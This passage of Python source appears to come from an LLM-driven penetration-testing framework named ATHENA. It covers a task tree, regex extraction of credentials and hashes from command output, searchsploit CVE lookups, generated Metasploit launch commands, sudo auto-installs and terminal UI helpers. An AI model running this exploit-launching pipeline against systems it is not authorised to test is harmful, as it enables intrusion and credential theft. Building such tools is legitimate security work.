        if nid in self.nodes and conf in ("green", "yellow", "red"):
            self.nodes[nid].confidence = conf

    def increment_attempts(self, nid: str):
        if nid in self.nodes:
            self.nodes[nid].attempts += 1

    def set_last_cmd(self, nid: str, cmd: str):
        if nid in self.nodes:
            self.nodes[nid].last_cmd = cmd[:200]

    # ─── Active node + frontier selection ──────────────────────────

    def find_in_progress(self) -> Optional[PTTNode]:
        for n in self.nodes.values():
            if n.status == "in_progress" and n.nid != self.root_id:
                return n
        return None

    def find_next_pending(self) -> Optional[PTTNode]:
        """Depth-first: return first todo node, preferring deeper subtrees."""
        # Sort by depth descending so deepest todos go first when their
        # parents are in_progress (we want to finish current branch).
        active = self.find_in_progress()
        if active:
            # Look at children of the active node first
            for cid in active.children:
                cn = self.nodes.get(cid)
                if cn and cn.status == "todo":
                    return cn
        # Otherwise just return any todo, shallow-first
        todos = [n for n in self.nodes.values()
                 if n.status == "todo" and n.nid != self.root_id]
        if not todos:
            return None
        todos.sort(key=lambda n: (n.depth, n.nid))
        return todos[0]

    def find_pending_siblings(self, nid: str) -> List[PTTNode]:
        n = self.nodes.get(nid)
        if not n or not n.parent_id:
            return []
        parent = self.nodes[n.parent_id]
        return [self.nodes[cid] for cid in parent.children
                if cid != nid and self.nodes[cid].status == "todo"]

    def all_done(self) -> bool:
        for n in self.nodes.values():
            if n.nid == self.root_id:
                continue
            if n.status in ("todo", "in_progress"):
                return False
        return True

    # ─── Findings ──────────────────────────────────────────────────

    def add_finding(self, value: str, ftype: str, source_cmd: str,
                    node_id: str, verified: bool = False,
                    notes: str = "") -> int:
        # de-dup by (ftype, value)
        for f in self.findings:
            if f.ftype == ftype and f.value == value:
                # Promote verification status if this run verified it
                if verified and not f.verified:
                    f.verified = True
                    f.source_cmd = source_cmd
                if node_id not in [f.node_id]:
                    pass  # keep first node that found it
                return f.fid
        fid = self._next_finding_id
        self._next_finding_id += 1
        f = Finding(fid=fid, value=value, ftype=ftype,
                    source_cmd=source_cmd, node_id=node_id,
                    verified=verified, notes=notes,
                    timestamp=datetime.datetime.now().isoformat(timespec="seconds"))
        self.findings.append(f)
        if node_id in self.nodes:
            self.nodes[node_id].findings.append(fid)
        return fid

    def get_findings_by_type(self, ftype: str,
                             only_verified: bool = False) -> List[Finding]:
        result = []
        for f in self.findings:
            if f.ftype != ftype:
                continue
            if only_verified and not f.verified:
                continue
            result.append(f)
        return result

    def get_unverified(self) -> List[Finding]:
        return [f for f in self.findings if not f.verified]

    def get_verified(self) -> List[Finding]:
        return [f for f in self.findings if f.verified]

    def drop_unverified(self):
        """Cleanup pass: remove findings that were never verified.
        Called once at report-generation time."""
        kept = [f for f in self.findings if f.verified]
        self.findings = kept

    # ─── Serialisation for LLM prompts ─────────────────────────────

    def to_natural_language(self, max_chars: int = 2000) -> str:
        """Render the tree as nested bullets for the system prompt.
        Compact form; deeper nodes get less verbose status."""
        lines = ["PENTESTING TASK TREE:"]
        root = self.nodes[self.root_id]
        lines.append(f"[{self.root_id}] {root.title}")
        for cid in root.children:
            self._serialise_subtree(cid, lines, indent=1)
        text = "\n".join(lines)
        if len(text) > max_chars:
            text = text[:max_chars] + "\n... [tree truncated for context]"
        return text

    def _serialise_subtree(self, nid: str, lines: List[str], indent: int):
        n = self.nodes.get(nid)
        if not n:
            return
        glyph = self.STATUS_GLYPH.get(n.status, "?")
        prefix = "  " * indent
        line = f"{prefix}{glyph} [{n.nid}] {n.title} ({n.phase}, status={n.status}"
        if n.attempts:
            line += f", attempts={n.attempts}"
        if n.findings:
            line += f", findings={len(n.findings)}"
        line += ")"
        lines.append(line)
        for cid in n.children:
            self._serialise_subtree(cid, lines, indent + 1)

    # ─── Terminal renderer (pretty print) ──────────────────────────

    def to_terminal(self) -> str:
        """Coloured tree for the REPL."""
        out = []
        root = self.nodes[self.root_id]
        out.append(f"\033[35m\033[1m  ♔ MISSION: {root.title}\033[0m")
        for i, cid in enumerate(root.children):
            is_last = (i == len(root.children) - 1)
            self._render_subtree(cid, out, prefix="  ", is_last=is_last)
        return "\n".join(out)

    def _render_subtree(self, nid: str, out: List[str],
                        prefix: str, is_last: bool):
        n = self.nodes.get(nid)
        if not n:
            return
        connector = "└─" if is_last else "├─"
        glyph = self.STATUS_GLYPH.get(n.status, "?")
        conf_color = self.CONF_COLOR.get(n.confidence, "37")

        # Color glyph by status
        status_colors = {
            "todo":        "90",
            "in_progress": "33",
            "done":        "32",
            "dead_end":    "31",
            "skipped":     "90",
        }
        gc = status_colors.get(n.status, "37")

        line = (
            f"{prefix}{connector}\033[{gc}m{glyph}\033[0m "
            f"\033[{conf_color}m[{n.nid}]\033[0m "
            f"\033[97m{n.title}\033[0m "
            f"\033[90m({n.phase})\033[0m"
        )
        if n.findings:
            line += f" \033[36m·{len(n.findings)}f\033[0m"
        if n.attempts:
            line += f" \033[90m·a{n.attempts}\033[0m"
        out.append(line)

        new_prefix = prefix + ("   " if is_last else "│  ")
        for i, cid in enumerate(n.children):
            child_last = (i == len(n.children) - 1)
            self._render_subtree(cid, out, new_prefix, child_last)

    # ─── Aggregate views (replaces v6.1 flat findings dict) ────────

    def findings_by_type_dict(self,
                              only_verified: bool = False) -> Dict[str, List[str]]:
        """Backward-compat view: legacy code expects a dict."""
        d: Dict[str, List[str]] = {}
        for f in self.findings:
            if only_verified and not f.verified:
                continue
            d.setdefault(f.ftype, []).append(f.value)
        return d


# ═════════════════════════════════════════════════════════════════════
# UTILITIES
# ═════════════════════════════════════════════════════════════════════

def get_lhost() -> str:
    try:
        r = subprocess.run(
            "hostname -I | awk '{print $1}'",
            shell=True, capture_output=True, text=True
        )
        ip = r.stdout.strip()
        if ip and ip != "127.0.0.1":
            return ip
    except Exception:
        pass
    return "127.0.0.1"


def ensure_rockyou():
    plain = "/usr/share/wordlists/rockyou.txt"
    gz    = "/usr/share/wordlists/rockyou.txt.gz"
    if os.path.exists(plain):
        return
    if os.path.exists(gz):
        print("\033[33m   Auto-unzipping rockyou.txt.gz...\033[0m")
        subprocess.run(f"sudo gunzip {gz}", shell=True)


def cmd_exists(cmd: str) -> bool:
    try:
        r = subprocess.run(f"which {cmd} 2>/dev/null", shell=True,
                           capture_output=True, text=True)
        return bool(r.stdout.strip())
    except Exception:
        return False


def get_credential_wordlist(top_n: int = 20) -> List[str]:
    for wl_path in CRED_WORDLISTS:
        if os.path.exists(wl_path):
            try:
                with open(wl_path) as f:
                    pwds = [line.strip() for line in f if line.strip()]
                    return pwds[:top_n]
            except Exception:
                continue
    return FALLBACK_PASSWORDS[:top_n]


def install_if_missing(tool: str) -> bool:
    if cmd_exists(tool):
        return True
    try:
        print(f"\033[33m   Auto-installing {tool}...\033[0m")
        subprocess.run(
            f"sudo apt install -y {tool} 2>/dev/null",
            shell=True, capture_output=True, text=True, timeout=90
        )
        return cmd_exists(tool)
    except Exception:
        return False


def detect_sensitive_paths(output: str) -> List[str]:
    found = []
    for pattern in SENSITIVE_PATH_PATTERNS:
        if re.search(pattern, output):
            cleaned = pattern.replace('\\', '').strip('/')
            if cleaned not in found:
                found.append(cleaned)
    return found


# ─── Source-tagged finding extraction ─────────────────────────────────
#
# Critical fix from v6.1: ONLY runs against raw subprocess stdout.
# Never against AI's prose.  Every finding records the command that
# produced it.  Strict context-aware patterns prevent the "200:not"
# style phantom credentials.
# ─────────────────────────────────────────────────────────────────────

def extract_findings_from_stdout(output: str,
                                 source_cmd: str,
                                 ptt: PTT,
                                 active_node_id: str) -> int:
    """Run regex patterns over RAW subprocess stdout only.

    Returns: number of new findings added.
    """
    if not output or len(output) < 20:
        return 0

    # Strip ANSI codes — they confuse regex
    clean = re.sub(r'\033\[[0-9;]*m', '', output)
    clean = re.sub(r'\x1b\[[0-9;]*m', '', clean)

    new_count = 0

    for ftype, pattern in FINDING_PATTERNS.items():
        try:
            matches = re.findall(pattern, clean, re.IGNORECASE | re.MULTILINE)
        except re.error:
            continue
        if not matches:
            continue

        for m in matches:
            if isinstance(m, tuple):
                # Tuple from groups — pick the first non-empty
                items = [x for x in m if x and len(str(x).strip()) > 1]
            else:
                items = [m] if m else []

            for raw in items:
                val = str(raw).strip().rstrip('.,;:)\'')

                # Quick noise filter
                if len(val) < 2:
                    continue

                if ftype == "ip" and val in IP_NOISE:
                    continue

                if ftype == "domain":
                    if val.lower() in DOMAIN_NOISE:
                        continue
                    # Filter noise like "etc.local", "1.2.3.4"
                    if re.match(r'^\d+\.\d+\.\d+\.\d+$', val):
                        continue
                    if "." not in val:
                        continue

                if ftype == "user":
                    # Drop common false-positives that appear in prose.
                    # Real but generic — record but leave verified=False
                    # so they get re-confirmed against an actual service.
                    pass  # intentional: no early-skip, dedup happens later

                if ftype == "cred":
                    # Drop credentials that look like placeholders
                    if val.lower() in {"<pass>", "<password>", "[redacted]",
                                       "***", "yourpass", "changeme"}:
                        continue
                    # Drop 1-2 char garbage
                    if len(val) < 4:
                        continue

                if ftype == "hash":
                    # Make sure this is hex-only and right length
                    if not re.fullmatch(r'[a-fA-F0-9]+', val):
                        continue
                    if len(val) not in (32, 40, 56, 64):
                        continue

                # Add to PTT (auto de-dups)
                fid_before = ptt._next_finding_id
                fid = ptt.add_finding(value=val, ftype=ftype,
                                source_cmd=source_cmd,
                                node_id=active_node_id)
                if ptt._next_finding_id > fid_before:
                    new_count += 1
                    # v7.1 — auto-tag with ATT&CK technique
                    # Prefer command-based pattern, fall back to ftype-based
                    tag = attack_id_for_command(source_cmd) or attack_id_for_finding(ftype)
                    if tag and ptt.findings:
                        f_obj = ptt.findings[-1]
                        if f_obj.fid == fid:
                            f_obj.attack_id, f_obj.attack_name, f_obj.attack_tactic = tag

    # Detect sensitive paths separately
    for path in detect_sensitive_paths(clean):
        fid_before = ptt._next_finding_id
        ptt.add_finding(value=path, ftype="exposed_path",
                        source_cmd=source_cmd, node_id=active_node_id)
        if ptt._next_finding_id > fid_before:
            new_count += 1
            tag = attack_id_for_finding("exposed_path")
            if tag and ptt.findings:
                f_obj = ptt.findings[-1]
                f_obj.attack_id, f_obj.attack_name, f_obj.attack_tactic = tag

    return new_count


def auto_cve_lookup(output: str) -> str:
    """Run searchsploit on CVEs and service versions found in output."""
    if not cmd_exists("searchsploit"):
        return ""

    results = []
    seen = set()

    cve_matches = re.findall(r'CVE-\d{4}-\d+', output, re.IGNORECASE)
    for cve in cve_matches[:3]:
        if cve in seen:
            continue
        seen.add(cve)
        try:
            r = subprocess.run(
                f"searchsploit '{cve}' 2>/dev/null | head -8",
                shell=True, capture_output=True, text=True, timeout=8
            )
            if r.stdout.strip() and "No Results" not in r.stdout:
                results.append(f"\n\033[35m[EXPLOIT: {cve}]\033[0m\n{r.stdout}")
        except Exception:
            pass

    matches = re.findall(
        r'\d+/tcp\s+open\s+\S+\s+(.+?)(?:\n|$)', output, re.IGNORECASE
    )
    for svc in matches[:3]:
        svc   = svc.strip()
        words = svc.split()
        query = " ".join(words[:2]) if len(words) >= 2 else svc
        if query in seen or len(query) < 3:
            continue
        seen.add(query)
        try:
            r = subprocess.run(
                f"searchsploit '{query}' 2>/dev/null | head -6",
                shell=True, capture_output=True, text=True, timeout=8
            )
            if r.stdout.strip() and "No Results" not in r.stdout:
                results.append(f"\n\033[35m[CVE: {query}]\033[0m\n{r.stdout}")
        except Exception:
            pass

    return "".join(results)


def analyze_and_suggest_exploit(cve: str, target: str, lhost: str) -> str:
    """When CVE found: searchsploit -j → MSF/standalone → ready commands."""
    if not cmd_exists("searchsploit"):
        return ""
    try:
        r = subprocess.run(
            f"searchsploit '{cve}' -j 2>/dev/null",
            shell=True, capture_output=True, text=True, timeout=10
        )
        if not r.stdout.strip():
            return ""
        try:
            data = json.loads(r.stdout)
            results = data.get("RESULTS_EXPLOIT", [])
        except Exception:
            return ""
        if not results:
            return ""

        msf_x   = [e for e in results if "metasploit" in e.get("Path","").lower()]
        other_x = [e for e in results if "metasploit" not in e.get("Path","").lower()]

        suggestions = []
        for e in msf_x[:2]:
            path = e.get("Path", "")
            title = e.get("Title", "")
            mm = re.search(r'exploits/([^/]+/[^/]+)/\d+', path)
            if mm:
                suggestions.append({
                    "type": "msf", "title": title,
                    "module": f"exploit/{mm.group(1)}/...",
                    "cve": cve,
                })
        for e in other_x[:2]:
            path = e.get("Path", "")
            title = e.get("Title", "")
            if path:
                suggestions.append({
                    "type": "standalone", "title": title,
                    "path": f"/usr/share/exploitdb/{path}",
                    "cve": cve,
                })

        if not suggestions:
            return ""

        out = f"\n\033[31m{'='*60}\033[0m\n"
        out += f"\033[31m⚔  EXPLOIT AVAILABLE: {cve}\033[0m\n"
        out += f"\033[31m{'='*60}\033[0m\n"
        for i, s in enumerate(suggestions, 1):
            out += f"\n\033[33m[OPTION {i}] {s['title']}\033[0m\n"
            if s['type'] == 'msf':
                out += "\033[90mType: Metasploit Module\033[0m\n"
                out += f"\033[97mSuggested:\033[0m\n"
                out += f"  echo 'use {s['module']}' > /tmp/exploit.rc\n"
                out += f"  echo 'set RHOSTS {target}' >> /tmp/exploit.rc\n"
                out += f"  echo 'set LHOST {lhost}' >> /tmp/exploit.rc\n"
                out += f"  echo 'run' >> /tmp/exploit.rc\n"
                out += f"  echo 'exit' >> /tmp/exploit.rc\n"
                out += f"  msfconsole -q -r /tmp/exploit.rc\n"
            else:
                out += f"\033[90mType: Standalone Exploit\033[0m\n"
                out += f"\033[97mPath:\033[0m {s['path']}\n"
                out += f"\033[97mInspect:\033[0m cat {s['path']}\n"
        out += f"\n\033[31m{'='*60}\033[0m\n"
        return out
    except Exception:
        return ""


def compress_output_for_history(output: str,
                                is_exploit_result: bool = False) -> str:
    """Aggressive compression of terminal output for AI context.
    Exploit results are kept intact (creds/shells matter)."""
    if is_exploit_result:
        return output[:MAX_OUTPUT_CHARS]

    output = re.sub(r'\033\[[0-9;]*m', '', output)
    output = re.sub(r'\x1b\[[0-9;]*m', '', output)
    lines = output.split('\n')

    junk = re.compile(r'|'.join([
        r'^Stats: ', r'^SYN Stealth Scan Timing', r'^\s*$',
        r'^Reading database', r'^Preparing to unpack',
        r'^Selecting previously', r'^Unpacking ',
        r'^Setting up ', r'^Processing triggers',
        r'^\(Reading database', r'^Get:\d', r'^Hit:\d', r'^Ign:\d',
        r'^Fetched ', r'^WARNING:.*Cannot open MAC',
        r'^Starting Nmap', r'^Nmap done:', r'^Nmap scan report',
    ]))

    cleaned, last = [], None
    for line in lines:
        line = line.rstrip()
        if junk.search(line):
            continue
        if line == last:
            continue
        if len(line) > 240:
            line = line[:240] + "..."
        cleaned.append(line)
        last = line

    result = '\n'.join(cleaned).strip()
    if len(result) > 1800:
        head = result[:800]
        tail = result[-600:]
        result = f"{head}\n[...{len(result)-1400} chars trimmed...]\n{tail}"
    return result or "(no useful output)"


# ─── Visual helpers ───────────────────────────────────────────────────

def hr(width: int = 64, char: str = "─", color: str = "90") -> str:
    return f"\033[{color}m{char * width}\033[0m"


def header_box(text: str, color: str = "35", width: int = 64) -> str:
    """v7.1 — heavier, two-line title bar that looks like a real UI panel."""
    inner = f" {text} ".center(width - 2)
    return (
        f"\033[{color}m╭{'─'*(width-2)}╮\n"
        f"│\033[1m{inner}\033[0m\033[{color}m│\n"
        f"╰{'─'*(width-2)}╯\033[0m"
    )


def panel(title: str, lines: List[str],
          color: str = "35", width: int = 66) -> str:
    """v7.1 — generic bordered panel with title bar.  Used everywhere
    we want a consistent app-like look."""
    out = []
    title_text = f" {title} "
    pad_left = (width - 2 - len(title_text)) // 2
    pad_right = width - 2 - len(title_text) - pad_left
    out.append(f"\033[{color}m╭{'─'*pad_left}\033[1m{title_text}\033[0m"
               f"\033[{color}m{'─'*pad_right}╮\033[0m")
    for ln in lines:
        # strip ANSI to compute true length
        visible = re.sub(r'\033\[[\d;]*m', '', ln)
        pad = max(0, width - 2 - len(visible))
        out.append(f"\033[{color}m│\033[0m {ln}{' ' * (pad - 1)}\033[{color}m│\033[0m")
    out.append(f"\033[{color}m╰{'─'*(width-2)}╯\033[0m")
    return "\n".join(out)


def status_line(model: str, agent: str, node: str,
                findings: int, verified: int) -> str:
    return (
        f"\033[90m[\033[97mmodel\033[90m] \033[36m{model}  "
        f"\033[90m[\033[97magent\033[90m] \033[33m{agent}  "
        f"\033[90m[\033[97mnode\033[90m] \033[97m{node}  "
        f"\033[90m[\033[97mfindings\033[90m] "
        f"\033[32m{verified}\033[90m/\033[97m{findings}\033[0m"
    )


def status_bar(target: str, agent: str, model: str,
               verified: int, unverified: int,
               techniques: int, scope_on: bool, width: int = 66) -> str:
    """v7.1 — persistent status bar shown at top of certain views.
    Like a window-chrome strip."""
    scope_pill = "\033[32m●SCOPE\033[0m" if scope_on else "\033[90m○scope\033[0m"
    target_short = (target[:14] + "…") if len(target) > 15 else target
    bar = (f"\033[97m▍\033[0m \033[36m{target_short:<15}\033[0m "
           f"\033[90m│\033[0m \033[33m{agent:<8}\033[0m "
           f"\033[90m│\033[0m \033[36m{model[:14]:<14}\033[0m "
           f"\033[90m│\033[0m \033[32m✓{verified}\033[0m\033[90m/\033[33m?{unverified}\033[0m "
           f"\033[90m│\033[0m \033[31mATT&CK ×{techniques}\033[0m "
           f"\033[90m│\033[0m {scope_pill}")
    visible = re.sub(r'\033\[[\d;]*m', '', bar)
    pad = max(0, width - len(visible))
    return f"\033[100m\033[97m {bar} {' '*pad}\033[0m"


def confidence_pill(conf: str) -> str:
    """v7.1 — visually-strong confidence indicator."""
    if conf == "green":
        return "\033[42m\033[97m\033[1m  GREEN ▶ EXECUTE  \033[0m"
    if conf == "yellow":
        return "\033[43m\033[30m\033[1m  YELLOW · CAUTION  \033[0m"
    if conf == "red":
        return "\033[41m\033[97m\033[1m  RED ✕ HOLD  \033[0m"
    return f"\033[100m\033[97m  {conf.upper()}  \033[0m"


def progress_bar(current: int, total: int, width: int = 24,
                 fill: str = "█", empty: str = "░") -> str:
    """v7.1 — text progress bar."""
    if total <= 0:
        return f"\033[90m{empty * width}\033[0m"
    pct = min(1.0, current / total)
    filled = int(pct * width)
    pct_text = f"{int(pct * 100):>3}%"
    return (f"\033[32m{fill * filled}\033[90m{empty * (width - filled)}"
            f"\033[0m \033[97m{pct_text}\033[0m \033[90m({current}/{total})\033[0m")


def kbd(label: str) -> str:
    """v7.1 — keycap-style button for prompts."""
    return f"\033[100m\033[97m {label} \033[0m"


def section(title: str, color: str = "35") -> str:
    """v7.1 — minimal section header with side rules."""
    line = "─" * 4
    return (f"\033[{color}m{line}\033[0m  \033[{color}m\033[1m{title}\033[0m  "
            f"\033[{color}m{'─' * (60 - len(title))}\033[0m")


def finding_card(f: Finding) -> str:
    """One-line card for a finding in the 'findings' command.
    v7.1: now shows ATT&CK technique tag if present."""
    icon_map = {
        "ip":           "🌐",
        "port":         "🔌",
        "user":         "👤",
        "hash":         "🔐",
        "hash_ntlm":    "🔐",
        "krb_hash":     "🎫",
        "ntlmv2":       "🔐",
        "cred":         "🔑",
        "cve":          "💥",
        "svc":          "⚙",
        "domain":       "🏷",
        "url":          "🔗",
        "exposed_path": "⚠",
        "smb_share":    "📂",
        "email":        "📧",
        "ssh_key":      "🗝",
        "aws_key":      "☁",
    }
    icon = icon_map.get(f.ftype, "•")
    verified_mark = "\033[32m●\033[0m" if f.verified else "\033[90m○\033[0m"
    val_short = f.value[:50] + ("…" if len(f.value) > 50 else "")
    attack_tag = (f" \033[36m{f.attack_id}\033[0m"
                  if f.attack_id else "")
    return (
        f"  {verified_mark} {icon}  \033[97m{f.ftype:<14}\033[0m "
        f"\033[36m{val_short}\033[0m "
        f"\033[90m[{f.node_id}]\033[0m{attack_tag}"
    )


def fancy_header(text: str, color: str = "35") -> str:
    width = max(len(text) + 4, 40)
    line = "─" * width
    padded = text.center(width - 2)
    return (
        f"\033[{color}m╭{line}╮\n"
        f"│ \033[1m{padded}\033[0m\033[{color}m │\n"
        f"╰{line}╯\033[0m"
    )


# ─────────────────────────────────────────────────────────────────────
# v7.2 — boxed UI primitives
#
# Goal: every event a turn produces gets its own titled box, so the
# operator can scan a session log at a glance.  Boxes are 70 cols wide
# (most phone terminals/SSH sessions render this well).  All boxes use
# the `panel()` building block so they share a consistent look.
# ─────────────────────────────────────────────────────────────────────

BOX_W = 70


def _visible_len(s: str) -> int:
    """Length without ANSI escapes."""
    return len(re.sub(r'\033\[[\d;]*m', '', s))


def _wrap_for_box(text: str, inner_width: int) -> List[str]:
    """Wrap a paragraph for box rendering (ANSI-aware)."""
    out: List[str] = []
    for raw_line in str(text).splitlines() or [""]:
        if not raw_line.strip():
            out.append("")
            continue
        # Greedy word-wrap — doesn't account for mid-word ANSI but
        # we only call this on plain text in practice.
        words = raw_line.split(" ")
        cur = ""
        for w in words:
            test = (cur + " " + w).strip() if cur else w
            if _visible_len(test) <= inner_width:
                cur = test
            else:
                if cur:
                    out.append(cur)
                # If a single word is too long, hard-cut
                while _visible_len(w) > inner_width:
                    out.append(w[:inner_width])
                    w = w[inner_width:]
                cur = w
        if cur:
            out.append(cur)
    return out


def _box(title: str, body_lines: List[str], color: str = "35",
         width: int = BOX_W, title_right: str = "") -> str:
    """Generic titled box.  Title on left, optional metadata on right.
    Body lines are taken verbatim (caller wraps if needed)."""
    inner = width - 2
    title_text = f" {title} " if title else ""
    right_text = f" {title_right} " if title_right else ""
    used = len(title_text) + len(right_text)
    fill = max(2, inner - used)
    top = (f"\033[{color}m╭{'─'*1}\033[0m\033[1m{title_text}\033[0m"
           f"\033[{color}m{'─'*fill}\033[0m"
           f"\033[1m{right_text}\033[0m"
           f"\033[{color}m{'─'*1}╮\033[0m")
    out = [top]
    for ln in body_lines:
        vis = _visible_len(ln)
        pad = max(0, inner - 2 - vis)
        out.append(f"\033[{color}m│\033[0m {ln}{' ' * pad} \033[{color}m│\033[0m")
    out.append(f"\033[{color}m╰{'─'*inner}╯\033[0m")
    return "\n".join(out)


def turn_box(turn_no: int, target: str, agent_role: str, model: str,
             verified: int, unverified: int, techniques: int,
             node_id: str, width: int = BOX_W) -> str:
    """v7.2 — header box for each agent turn."""
    spec = AGENT_SPECS.get(agent_role, AGENT_SPECS["recon"])
    target_short = (target[:18] + "…") if len(target) > 19 else target
    metas = [
        f"target \033[36m{target_short}\033[0m",
        f"node \033[97m{node_id or '—'}\033[0m",
        f"\033[32m✓{verified}\033[0m\033[90m/\033[33m?{unverified}\033[0m",
        f"\033[31mATT&CK ×{techniques}\033[0m",
        f"\033[90m{model}\033[0m",
    ]
    body = ["  " + "  \033[90m·\033[0m  ".join(metas),
            f"  \033[{spec['color']}m\033[1m{spec['icon']} {spec['name']}\033[0m"]
    return _box(f"TURN {turn_no}", body, color="35",
                width=width, title_right=f"v{VERSION}")


def thought_card(thought: str, agent_role: str, width: int = BOX_W) -> str:
    """v7.2 — boxed agent thought block."""
    spec = AGENT_SPECS.get(agent_role, AGENT_SPECS["recon"])
    inner = width - 4
    lines = _wrap_for_box(thought, inner)
    if not lines:
        lines = ["(no reasoning produced)"]
    body = []
    for ln in lines:
        body.append(f"\033[{spec['color']}m▎\033[0m \033[90m\033[3m{ln}\033[0m")
    return _box("THOUGHT", body, color=spec["color"], width=width)


def dispatch_card(tool: str, shell_str: str, attack_id: str = "",
                  attack_name: str = "", remap_note: str = "",
                  width: int = BOX_W) -> str:
    """v7.2 — boxed structured tool dispatch."""
    inner = width - 4
    body = [f"  \033[36m{tool}\033[0m \033[90m→\033[0m"]
    for ln in _wrap_for_box(shell_str, inner - 2):
        body.append(f"  \033[97m{ln}\033[0m")
    if remap_note:
        body.append(f"  \033[90m\033[3m{remap_note}\033[0m")
    title_right = ""
    if attack_id:
        title_right = f"{attack_id} {attack_name[:22]}"
    return _box("DISPATCH", body, color="36", width=width,
                title_right=title_right)


def command_card(shell_str: str, conf: str = "green", attack_id: str = "",
                 attack_name: str = "", verify: bool = False,
                 width: int = BOX_W) -> str:
    """v7.2 — proposed command, with confidence pill inline."""
    inner = width - 4
    pill_map = {
        "green":  "\033[42m\033[97m\033[1m GREEN ▶ \033[0m",
        "yellow": "\033[43m\033[30m\033[1m YELLOW · \033[0m",
        "red":    "\033[41m\033[97m\033[1m RED ✕ \033[0m",
    }
    pill = pill_map.get(conf, "\033[100m\033[97m  ?  \033[0m")
    body = []
    for ln in _wrap_for_box(shell_str, inner - 2):
        body.append(f"  \033[97m\033[1m{ln}\033[0m")
    body.append("")
    body.append(f"  conf: {pill}")
    title = "VERIFICATION" if verify else "COMMAND"
    color = "31" if verify else "35"
    title_right = ""
    if attack_id:
        title_right = f"{attack_id} {attack_name[:22]}"
    return _box(title, body, color=color, width=width,
                title_right=title_right)


def result_box(output: str, *, lines_shown: int = 12,
               width: int = BOX_W) -> str:
    """v7.2 — boxed command result, with truncation indicator."""
    inner = width - 4
    raw_lines = output.splitlines()
    shown = raw_lines[:lines_shown]
    truncated = len(raw_lines) > lines_shown
    body: List[str] = []
    for ln in shown:
        # Truncate per-line at inner-2 visible chars
        vis = _visible_len(ln)
        if vis > inner - 2:
            ln = ln[:inner - 4] + "…"
        body.append(f"  {ln}")
    if truncated:
        body.append(f"  \033[90m\033[3m… +{len(raw_lines) - lines_shown} "
                    f"more line(s) (full output stored for AI context)\033[0m")
    if not body:
        body = ["  \033[90m(no output)\033[0m"]
    return _box("RESULT", body, color="32", width=width)


def error_alert(title: str, message: str, hint: str = "",
                width: int = BOX_W) -> str:
    """v7.2 — bold red boxed alert for blocked / failed states."""
    inner = width - 4
    body: List[str] = []
    for ln in _wrap_for_box(message, inner - 2):
        body.append(f"  \033[31m{ln}\033[0m")
    if hint:
        body.append("")
        for ln in _wrap_for_box(hint, inner - 2):
            body.append(f"  \033[33m\033[1m▸\033[0m \033[97m{ln}\033[0m")
    return _box(f"⛔ {title}", body, color="31", width=width)


def findings_card(new_count: int, items: List[str], width: int = BOX_W) -> str:
    """v7.2 — boxed summary of newly extracted findings from one cmd."""
    inner = width - 4
    body: List[str] = []
    for it in items[:10]:
        if _visible_len(it) > inner - 2:
            it = it[:inner - 4] + "…"
        body.append(f"  {it}")
    if len(items) > 10:
        body.append(f"  \033[90m… +{len(items) - 10} more\033[0m")
    if not body:
        body = ["  \033[90m(no extractable findings this turn)\033[0m"]
    return _box(f"FINDINGS +{new_count}", body, color="32", width=width)


def thinking_indicator(model_name: str = "") -> str:
    """v7.1 — single-line indicator shown while LLM is thinking."""
    suffix = f" \033[90m· {model_name}\033[0m" if model_name else ""
    return f"\033[35m   ◆ ATHENA thinking…\033[0m{suffix}"


def boot_sequence_lines() -> List[str]:
    """v7.2 — cinematic boot lines printed on startup."""
    graph_glyph = "\033[32m✓\033[0m" if HAS_NETWORKX else "\033[33m⚠\033[0m"
    graph_msg = ("\033[32mnetworkx ready\033[0m" if HAS_NETWORKX else
                 "\033[33mnetworkx missing — disabled\033[0m")
    return [
        "\033[90m   [boot]\033[0m \033[32m✓\033[0m  loading cognitive matrix",
        "\033[90m   [boot]\033[0m \033[32m✓\033[0m  initialising Pentesting Task Tree",
        "\033[90m   [boot]\033[0m \033[32m✓\033[0m  registering 11 specialist agents",
        f"\033[90m   [boot]\033[0m \033[32m✓\033[0m  registering {len(TOOL_DISPATCH)} structured tools",
        f"\033[90m   [boot]\033[0m \033[32m✓\033[0m  loading {len(MITRE_TECHNIQUES)} ATT&CK technique mappings",
        f"\033[90m   [boot]\033[0m {graph_glyph}  attack graph: {graph_msg}",
        "\033[90m   [boot]\033[0m \033[32m✓\033[0m  smart-context manager online",
        "\033[90m   [boot]\033[0m \033[32m✓\033[0m  loop-breaker + sudo-retry armed",
        "\033[90m   [boot]\033[0m \033[32m✓\033[0m  Groq provider chain primed",
    ]


# ═════════════════════════════════════════════════════════════════════
# SPEAKER-ROLE HELPERS (v7.1 user-friendly UX layer)
#
# Every line printed to the operator should answer "who's saying this?"
# at a glance.  Five voices:
#
#   PRIEST  — the operator (you).  Input prompts only.
#   ATHENA  — the framework itself (target setup, reports, errors).
#   AGENT   — the LLM specialist's reasoning / decision.
#   EXEC    — a command being proposed / executed.
#   SYS     — system-level info (warnings, hints, dim notes).
#
# Each voice has a fixed colour + glyph so the operator knows instantly
# who's talking without parsing whole lines.
# ═════════════════════════════════════════════════════════════════════

# ANSI colour shorthands
_C_PRIEST = "\033[35m"   # magenta — operator
_C_ATHENA = "\033[96m"   # bright cyan — framework voice
_C_AGENT  = "\033[33m"   # yellow — LLM agent
_C_EXEC   = "\033[97m"   # bright white — commands
_C_SYS    = "\033[90m"   # grey — system/dim notes
_C_OK     = "\033[32m"   # green — success
_C_WARN   = "\033[33m"   # yellow — warning
_C_ERR    = "\033[31m"   # red — error
_C_RESET  = "\033[0m"
_C_BOLD   = "\033[1m"
_C_DIM    = "\033[2m"


def say_athena(message: str, *, indent: int = 3):
    """Framework voice — Athena talking AS the system, not as an agent."""
    pad = " " * indent
    print(f"{pad}{_C_ATHENA}{_C_BOLD}◈ ATHENA{_C_RESET}{_C_ATHENA}  {message}{_C_RESET}")


def say_agent(message: str, agent_role: str = "agent", *, indent: int = 3):
    """Specialist agent voice — the LLM's reasoning."""
    spec = AGENT_SPECS.get(agent_role, AGENT_SPECS["recon"])
    icon = spec["icon"]
    color = spec["color"]
    pad = " " * indent
    print(f"{pad}\033[{color}m{_C_BOLD}{icon} {spec['name'].split()[0]}{_C_RESET}"
          f"\033[{color}m  {message}{_C_RESET}")


def say_priest_prompt(prompt: str = "") -> str:
    """Render the priest input prompt (returns the formatted string for input())."""
    return f"  {_C_PRIEST}{_C_BOLD}⚔ priest{_C_RESET}{_C_PRIEST} ›{_C_RESET} {prompt}"


def say_sys(message: str, *, color: str = "90", indent: int = 3):
    """Generic system message (warnings, hints, info)."""
    pad = " " * indent
    print(f"{pad}\033[{color}m▸ {message}{_C_RESET}")


def say_dim(message: str, *, indent: int = 3):
